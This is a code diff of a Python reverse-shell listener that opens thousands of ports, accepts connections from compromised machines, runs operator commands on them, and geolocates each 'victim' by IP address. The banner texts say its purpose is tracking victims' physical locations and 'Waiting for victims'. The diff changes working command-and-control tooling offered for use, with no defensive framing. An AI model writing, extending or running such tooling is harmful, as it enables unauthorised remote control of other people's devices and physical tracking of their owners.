@@ -1,4 +1,9 @@
 #!/usr/bin/env python3
+"""
+Enhanced Reverse Shell Listener - 2026 Version
+Starts listening from port 60000 to match Flask app
+"""
+
 import socket
 import threading
 import sys
@@ -10,14 +15,6 @@ from datetime import datetime
 import geoip2.database
 import geoip2.errors
 import requests
-
-# Try to import readline for better CLI (Unix-like systems)
-try:
-    import readline
-    READLINE_AVAILABLE = True
-except ImportError:
-    READLINE_AVAILABLE = False
-    # For Windows, we'll still work without tab completion
 
 # ==================== ANSI COLORS ====================
 class Colors:
@@ -38,7 +35,7 @@ class GeoIPManager:
         self.load_database()
     
     def load_database(self):
-        """Try to load GeoLite2 database from common locations"""
+        """Try to load GeoLite2 database"""
         possible_paths = [
             './GeoLite2-City.mmdb',
             './GeoLite2-Country.mmdb',
@@ -46,13 +43,6 @@ class GeoIPManager:
             '/usr/local/share/GeoIP/GeoLite2-City.mmdb',
             os.path.expanduser('~/.local/share/GeoIP/GeoLite2-City.mmdb')
         ]
-        
-        # Also check Windows paths
-        if sys.platform == 'win32':
-            possible_paths.extend([
-                'C:\\GeoIP\\GeoLite2-City.mmdb',
-                os.path.expanduser('~\\AppData\\Local\\GeoIP\\GeoLite2-City.mmdb')
-            ])
         
         for path in possible_paths:
             try:
@@ -64,18 +54,16 @@ class GeoIPManager:
             except:
                 continue
         
-        print(f"{Colors.YELLOW}⚠ No GeoIP2 database found. Will use fallback HTTP API.{Colors.END}")
+        print(f"{Colors.YELLOW}⚠ No GeoIP2 database found. Using HTTP API.{Colors.END}")
     
     def get_location(self, ip):
-        """Get location info using geoip2 database or fallback API"""
+        """Get location info"""
         location = {
             'country': 'Unknown',
             'region': 'Unknown',
             'city': 'Unknown',
             'latitude': None,
             'longitude': None,
-            'postal_code': None,
-            'timezone': None,
             'isp': 'Unknown',
             'source': None
         }
@@ -90,15 +78,11 @@ class GeoIPManager:
                     'city': response.city.name or 'Unknown',
                     'latitude': response.location.latitude,
                     'longitude': response.location.longitude,
-                    'postal_code': response.postal.code,
-                    'timezone': response.location.time_zone,
                     'source': 'GeoIP2 Database'
                 })
                 return location
-            except geoip2.errors.AddressNotFoundError:
+            except:
                 pass
-            except Exception as e:
-                print(f"{Colors.YELLOW}⚠ GeoIP2 database error: {e}{Colors.END}")
         
         # Fallback to HTTP API
         try:
@@ -113,7 +97,6 @@ class GeoIPManager:
                         'latitude': data.get('lat'),
                         'longitude': data.get('lon'),
                         'isp': data.get('isp', 'Unknown'),
-                        'timezone': data.get('timezone', 'Unknown'),
                         'source': 'ip-api.com'
                     })
         except:
@@ -123,11 +106,11 @@ class GeoIPManager:
 
 # ==================== DEVICE CLASS ====================
 class Device:
-    def __init__(self, device_id, ip, port, socket, geoip_manager):
+    def __init__(self, device_id, ip, port, client_socket, geoip):
         self.id = device_id
         self.ip = ip
         self.port = port
-        self.socket = socket
+        self.socket = client_socket
         self.first_seen = datetime.now()
         self.last_seen = datetime.now()
         self.active = True
@@ -136,7 +119,7 @@ class Device:
         self.hostname = self.get_hostname()
         self.commands = []
         self.notes = ""
-        self.geoip = geoip_manager
+        self.geoip = geoip
         self.location = self.geoip.get_location(ip)
     
     def get_hostname(self):
@@ -177,15 +160,11 @@ class Device:
         if self.location['latitude'] and self.location['longitude']:
             return f"{self.location['latitude']:.4f}, {self.location['longitude']:.4f}"
         return "Unknown"
-    
-    def get_map_link(self):
-        if self.location['latitude'] and self.location['longitude']:
-            return f"https://www.google.com/maps?q={self.location['latitude']},{self.location['longitude']}"
-        return None
 
 # ==================== MAIN LISTENER CLASS ====================
 class ReverseShellListener:
     def __init__(self, start_port=60000, end_port=65535):
+        """Initialize listener with start_port=60000 to match Flask"""
         self.start_port = start_port
         self.end_port = end_port
         self.devices = {}
@@ -194,6 +173,16 @@ class ReverseShellListener:
         self.lock = threading.Lock()
         self.running = True
         self.geoip = GeoIPManager()
+        
+        print(f"\n{Colors.BOLD}{Colors.GREEN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.GREEN}║     🌍 REVERSE SHELL LISTENER - 2026                      ║{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.GREEN}║         Listening from port 60000                         ║{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.GREEN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
+        print(f"\n{Colors.BOLD}Configuration:{Colors.END}")
+        print(f"  Start Port: {self.start_port} (matching Flask)")
+        print(f"  End Port: {self.end_port}")
+        print(f"  Total Ports: {self.end_port - self.start_port + 1}")
+        print(f"  Type '{Colors.CYAN}help{Colors.END}' for commands\n")
     
     def add_device(self, ip, port, client_socket):
         with self.lock:
@@ -221,15 +210,8 @@ class ReverseShellListener:
             print(f"  Hostname: {device.hostname}")
             print(f"  Location: {device.get_location_string()}")
             print(f"  Coordinates: {device.get_coordinates()}")
-            if device.location.get('postal_code'):
-                print(f"  Postal:   {device.location['postal_code']}")
             if device.location.get('isp', 'Unknown') != 'Unknown':
                 print(f"  ISP:      {device.location['isp']}")
-            if device.location.get('timezone'):
-                print(f"  Timezone: {device.location['timezone']}")
-            if device.get_map_link():
-                print(f"  Map:      {device.get_map_link()}")
-            print(f"  Source:   {device.location['source']}")
             print(f"{Colors.BOLD}{'═'*60}{Colors.END}")
             print(f"  Type 'list' to see all devices")
             print(f"  Type 'use {device_id}' to interact\n")
@@ -249,87 +231,27 @@ class ReverseShellListener:
         if not self.devices:
             return f"{Colors.YELLOW}No devices connected yet{Colors.END}"
         
-        result = f"\n{Colors.BOLD}{'═'*110}{Colors.END}\n"
-        result += f"{Colors.BOLD}{'ID':<4} {'IP':<16} {'Location':<40} {'OS':<10} {'Status':<10} {'Last Seen'}{Colors.END}\n"
-        result += f"{Colors.BOLD}{'═'*110}{Colors.END}\n"
+        result = f"\n{Colors.BOLD}{'═'*100}{Colors.END}\n"
+        result += f"{Colors.BOLD}{'ID':<4} {'IP':<16} {'Location':<35} {'OS':<10} {'Status':<10} {'Last Seen'}{Colors.END}\n"
+        result += f"{Colors.BOLD}{'═'*100}{Colors.END}\n"
         
         for device in self.devices.values():
             marker = f"{Colors.GREEN}→{Colors.END} " if self.current_id == device.id else "  "
             status = f"{Colors.GREEN}● ACTIVE{Colors.END}" if device.active else f"{Colors.RED}○ OFFLINE{Colors.END}"
             
             location = device.get_location_string()
-            if len(location) > 39:
-                location = location[:36] + "..."
+            if len(location) > 34:
+                location = location[:31] + "..."
             
             last_seen = device.last_seen.strftime('%H:%M:%S')
             
-            result += f"{marker}{device.id:<2} {device.ip:<16} {location:<40} {device.os:<10} {status:<10} {last_seen}\n"
+            result += f"{marker}{device.id:<2} {device.ip:<16} {location:<35} {device.os:<10} {status:<10} {last_seen}\n"
         
-        result += f"{Colors.BOLD}{'═'*110}{Colors.END}\n"
+        result += f"{Colors.BOLD}{'═'*100}{Colors.END}\n"
         active = len([d for d in self.devices.values() if d.active])
         result += f"Total: {len(self.devices)} devices ({active} active)\n"
-        result += f"GeoIP Source: {self.geoip.db_path or 'HTTP API'}\n"
         
         return result
-    
-    def show_device_details(self, device_id):
-        if device_id not in self.devices:
-            return f"{Colors.RED}Device {device_id} not found{Colors.END}"
-        
-        d = self.devices[device_id]
-        
-        result = f"\n{Colors.BOLD}📋 DEVICE DETAILS - ID: {device_id}{Colors.END}\n"
-        result += f"{'═'*60}\n"
-        result += f"{Colors.BOLD}Network Information:{Colors.END}\n"
-        result += f"  IP Address:     {d.ip}\n"
-        result += f"  Port:           {d.port}\n"
-        result += f"  Hostname:       {d.hostname}\n"
-        result += f"  OS:             {d.os}\n"
-        result += f"\n{Colors.BOLD}📍 Location Information:{Colors.END}\n"
-        result += f"  Country:        {d.location['country']}\n"
-        result += f"  Region:         {d.location['region']}\n"
-        result += f"  City:           {d.location['city']}\n"
-        result += f"  Coordinates:    {d.get_coordinates()}\n"
-        if d.location.get('postal_code'):
-            result += f"  Postal Code:    {d.location['postal_code']}\n"
-        if d.get_map_link():
-            result += f"  Map:            {d.get_map_link()}\n"
-        if d.location.get('isp', 'Unknown') != 'Unknown':
-            result += f"  ISP:            {d.location['isp']}\n"
-        if d.location.get('timezone'):
-            result += f"  Timezone:       {d.location['timezone']}\n"
-        result += f"  Data Source:    {d.location['source']}\n"
-        result += f"\n{Colors.BOLD}⏱️  Timeline:{Colors.END}\n"
-        result += f"  First Seen:     {d.first_seen.strftime('%Y-%m-%d %H:%M:%S')}\n"
-        result += f"  Last Seen:      {d.last_seen.strftime('%H:%M:%S')}\n"
-        result += f"  Reconnections:  {d.reconnections}\n"
-        result += f"  Commands Run:   {len(d.commands)}\n"
-        if d.notes:
-            result += f"\n{Colors.BOLD}📝 Notes:{Colors.END}\n  {d.notes}\n"
-        result += f"{'═'*60}\n"
-        
-        return result
-    
-    def export_devices(self, filename="devices.json"):
-        data = []
-        for device in self.devices.values():
-            data.append({
-                'id': device.id,
-                'ip': device.ip,
-                'port': device.port,
-                'hostname': device.hostname,
-                'os': device.os,
-                'first_seen': device.first_seen.isoformat(),
-                'last_seen': device.last_seen.isoformat(),
-                'reconnections': device.reconnections,
-                'location': device.location,
-                'notes': device.notes,
-                'commands': device.commands
-            })
-        
-        with open(filename, 'w') as f:
-            json.dump(data, f, indent=2)
-        print(f"{Colors.GREEN}✓ Exported {len(data)} devices to {filename}{Colors.END}")
     
     def handle_device_session(self, client_socket, addr, port):
         device_id = self.add_device(addr[0], port, client_socket)
@@ -341,21 +263,7 @@ class ReverseShellListener:
                     location = device.get_location_string()
                     
                     prompt = f"\n{Colors.CYAN}device[{device_id}:{addr[0]} - {location}]>{Colors.END} "
-                    
-                    # Handle input differently based on platform
-                    if sys.platform == 'win32':
-                        # Simple input for Windows (no readline)
-                        cmd = input(prompt)
-                    else:
-                        # For Unix-like systems, we can use readline if available
-                        try:
-                            if READLINE_AVAILABLE:
-                                # Simple input - readline works automatically
-                                cmd = input(prompt)
-                            else:
-                                cmd = input(prompt)
-                        except:
-                            cmd = input(prompt)
+                    cmd = input(prompt)
                     
                     if cmd.lower() == 'back':
                         self.current_id = None
@@ -367,36 +275,17 @@ class ReverseShellListener:
                         break
                     
                     elif cmd.lower() == 'info':
-                        print(self.show_device_details(device_id))
-                    
-                    elif cmd.lower() == 'map':
-                        link = device.get_map_link()
-                        if link:
-                            print(f"{Colors.GREEN}📍 Google Maps: {link}{Colors.END}")
-                        else:
-                            print(f"{Colors.RED}No coordinates available{Colors.END}")
+                        print(f"\n{Colors.BOLD}Device {device_id} Details:{Colors.END}")
+                        print(f"  IP: {device.ip}")
+                        print(f"  Port: {device.port}")
+                        print(f"  OS: {device.os}")
+                        print(f"  Location: {device.get_location_string()}")
+                        print(f"  First Seen: {device.first_seen.strftime('%H:%M:%S')}")
+                        print(f"  Commands: {len(device.commands)}")
                     
                     elif cmd.startswith('note '):
                         device.notes = cmd[5:]
                         print(f"{Colors.GREEN}Note saved{Colors.END}")
-                    
-                    elif cmd.lower() == 'clear':
-                        if sys.platform == 'win32':
-                            os.system('cls')
-                        else:
-                            os.system('clear')
-                    
-                    elif cmd.lower() == 'help':
-                        print(f"""
-{Colors.BOLD}Device Commands:{Colors.END}
-  back        - Return to main menu
-  info        - Show device details
-  map         - Show Google Maps link
-  note <text> - Add a note about this device
-  clear       - Clear screen
-  exit        - Close connection
-  <command>   - Execute command on device
-                        """)
                     
                     else:
                         try:
@@ -414,28 +303,15 @@ class ReverseShellListener:
                     time.sleep(1)
                     
         except Exception as e:
-            print(f"{Colors.RED}Error with device {device_id}: {e}{Colors.END}")
+            print(f"{Colors.RED}Error: {e}{Colors.END}")
         finally:
             self.remove_device(device_id)
             client_socket.close()
     
-    def start_listener(self):
-        print(f"\n{Colors.BOLD}{Colors.GREEN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
-        print(f"{Colors.BOLD}{Colors.GREEN}║     🌍 GEOIP2 REVERSE SHELL LISTENER                      ║{Colors.END}")
-        print(f"{Colors.BOLD}{Colors.GREEN}║         Track physical locations of victims                ║{Colors.END}")
-        print(f"{Colors.BOLD}{Colors.GREEN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
-        print(f"\n{Colors.BOLD}Configuration:{Colors.END}")
-        print(f"  Port Range: {self.start_port} - {self.end_port}")
-        print(f"  Total Ports: {self.end_port - self.start_port + 1}")
-        print(f"  Python Version: {sys.version.split()[0]}")
-        print(f"  Platform: {sys.platform}")
-        print(f"  GeoIP2 Database: {self.geoip.db_path or 'Not found (using HTTP API)'}")
-        if READLINE_AVAILABLE:
-            print(f"  Tab Completion: Available")
-        else:
-            print(f"  Tab Completion: Not available on this platform")
-        print(f"  Type '{Colors.CYAN}help{Colors.END}' for commands\n")
+    def start(self):
+        """Start listening on all ports from start_port to end_port"""
         
+        # Start listeners for each port in range
         for port in range(self.start_port, self.end_port + 1):
             def listen_port(p):
                 try:
@@ -456,163 +332,31 @@ class ReverseShellListener:
                         except:
                             pass
                 except:
-                    pass
+                    pass  # Port might be in use
             
             t = threading.Thread(target=listen_port, args=(port,))
             t.daemon = True
             t.start()
             
+            # Show progress
             if port % 1000 == 0:
                 print(f"  Listening on ports up to {port}")
         
-        print(f"\n{Colors.GREEN}✓ Listening on all ports{Colors.END}")
-        print(f"{Colors.YELLOW}Waiting for connections...{Colors.END}\n")
+        print(f"\n{Colors.GREEN}✓ Now listening on ports {self.start_port}-{self.end_port}{Colors.END}")
+        print(f"{Colors.YELLOW}Waiting for victims... (Press Ctrl+C to stop){Colors.END}\n")
         
-        self.command_loop()
-    
-    def command_loop(self):
-        while self.running:
-            try:
-                cmd = input(f"{Colors.PURPLE}listener>{Colors.END} ").strip().lower()
-                
-                if cmd in ['exit', 'quit']:
-                    self.running = False
-                    print(f"{Colors.YELLOW}Shutting down...{Colors.END}")
-                    break
-                
-                elif cmd in ['help', '?']:
-                    self.show_help()
-                
-                elif cmd in ['list', 'devices', 'ls']:
-                    print(self.list_devices())
-                
-                elif cmd == 'geoip':
-                    print(f"\n{Colors.BOLD}GeoIP Information:{Colors.END}")
-                    print(f"  Database: {self.geoip.db_path or 'Not found'}")
-                    print(f"  Fallback: HTTP API (ip-api.com)")
-                
-                elif cmd.startswith('use '):
-                    target = cmd[4:].strip()
-                    success = False
-                    
-                    if target.isdigit():
-                        device_id = int(target)
-                        if device_id in self.devices and self.devices[device_id].active:
-                            self.current_id = device_id
-                            device = self.devices[device_id]
-                            print(f"{Colors.GREEN}✓ Switched to device {device_id} ({device.ip} - {device.get_location_string()}){Colors.END}")
-                            print(f"  Type 'help' for device commands, 'back' to return")
-                            success = True
-                    
-                    if not success:
-                        for device in self.devices.values():
-                            if device.ip == target and device.active:
-                                self.current_id = device.id
-                                print(f"{Colors.GREEN}✓ Switched to device {device.id} ({device.ip} - {device.get_location_string()}){Colors.END}")
-                                print(f"  Type 'help' for device commands, 'back' to return")
-                                success = True
-                                break
-                    
-                    if not success:
-                        print(f"{Colors.RED}✗ Device '{target}' not found or inactive{Colors.END}")
-                
-                elif cmd.startswith('info '):
-                    try:
-                        device_id = int(cmd[5:].strip())
-                        print(self.show_device_details(device_id))
-                    except:
-                        print(f"{Colors.RED}Usage: info <device_id>{Colors.END}")
-                
-                elif cmd.startswith('map '):
-                    try:
-                        device_id = int(cmd[4:].strip())
-                        if device_id in self.devices:
-                            link = self.devices[device_id].get_map_link()
-                            if link:
-                                print(f"{Colors.GREEN}📍 Google Maps: {link}{Colors.END}")
-                            else:
-                                print(f"{Colors.RED}No coordinates for device {device_id}{Colors.END}")
-                        else:
-                            print(f"{Colors.RED}Device {device_id} not found{Colors.END}")
-                    except:
-                        print(f"{Colors.RED}Usage: map <device_id>{Colors.END}")
-                
-                elif cmd.startswith('export'):
-                    parts = cmd.split()
-                    filename = parts[1] if len(parts) > 1 else "devices.json"
-                    self.export_devices(filename)
-                
-                elif cmd == 'stats':
-                    active = len([d for d in self.devices.values() if d.active])
-                    total = len(self.devices)
-                    
-                    countries = {}
-                    for d in self.devices.values():
-                        country = d.location['country']
-                        countries[country] = countries.get(country, 0) + 1
-                    
-                    print(f"\n{Colors.BOLD}Statistics:{Colors.END}")
-                    print(f"  Active devices: {active}")
-                    print(f"  Total devices:  {total}")
-                    print(f"  Current device: {self.current_id or 'None'}")
-                    print(f"\n{Colors.BOLD}Geographic Distribution:{Colors.END}")
-                    for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True):
-                        if country != 'Unknown':
-                            print(f"  {country}: {count}")
-                    if 'Unknown' in countries:
-                        print(f"  Unknown: {countries['Unknown']}")
-                    print("")
-                
-                elif cmd == 'clear':
-                    if sys.platform == 'win32':
-                        os.system('cls')
-                    else:
-                        os.system('clear')
-                
-                elif cmd == '':
-                    continue
-                
-                else:
-                    print(f"{Colors.RED}Unknown command: {cmd}{Colors.END}")
-                    
-            except KeyboardInterrupt:
-                print(f"\n{Colors.YELLOW}Use 'exit' to quit{Colors.END}")
-            except Exception as e:
-                print(f"{Colors.RED}Error: {e}{Colors.END}")
-    
-    def show_help(self):
-        print(f"""
-{Colors.BOLD}╔══════════════════════════════════════════════════════════╗
-║                     MAIN COMMANDS                          ║
-╠════════════════════════════════════════════════════════════╣{Colors.END}
-  {Colors.GREEN}list, devices, ls{Colors.END}    - Show all connected devices with location
-  {Colors.GREEN}use <id or IP>{Colors.END}       - Switch to a specific device
-  {Colors.GREEN}info <id>{Colors.END}            - Show detailed device information
-  {Colors.GREEN}map <id>{Colors.END}             - Show Google Maps link for device
-  {Colors.GREEN}export [filename]{Colors.END}    - Export device data to JSON
-  {Colors.GREEN}stats{Colors.END}                 - Show statistics with geographic distribution
-  {Colors.GREEN}geoip{Colors.END}                 - Show GeoIP database status
-  {Colors.GREEN}clear{Colors.END}                 - Clear the screen
-  {Colors.GREEN}help, ?{Colors.END}               - Show this help
-  {Colors.GREEN}exit, quit{Colors.END}            - Shutdown listener
-
-{Colors.BOLD}╔══════════════════════════════════════════════════════════╗
-║                  DEVICE COMMANDS                           ║
-╠════════════════════════════════════════════════════════════╣{Colors.END}
-  When connected to a device (use <id>), you can run:
-  
-  {Colors.GREEN}back{Colors.END}                   - Return to main menu
-  {Colors.GREEN}info{Colors.END}                   - Show detailed device info
-  {Colors.GREEN}map{Colors.END}                    - Show Google Maps link
-  {Colors.GREEN}note <text>{Colors.END}             - Add a note about this device
-  {Colors.GREEN}clear{Colors.END}                   - Clear the screen
-  {Colors.GREEN}exit{Colors.END}                    - Close device connection
-  {Colors.GREEN}<command>{Colors.END}                - Execute any command on the device
-        """)
+        # Keep main thread alive
+        try:
+            while self.running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
+            self.running = False
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
-    listener = ReverseShellListener(60000, 65535)
+    # Start listener from port 60000 (matching Flask)
+    listener = ReverseShellListener(start_port=60000, end_port=65535)
     
     def signal_handler(sig, frame):
         print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
@@ -620,4 +364,4 @@ if __name__ == "__main__":
         sys.exit(0)
     
     signal.signal(signal.SIGINT, signal_handler)
-    listener.start_listener()
+    listener.start()
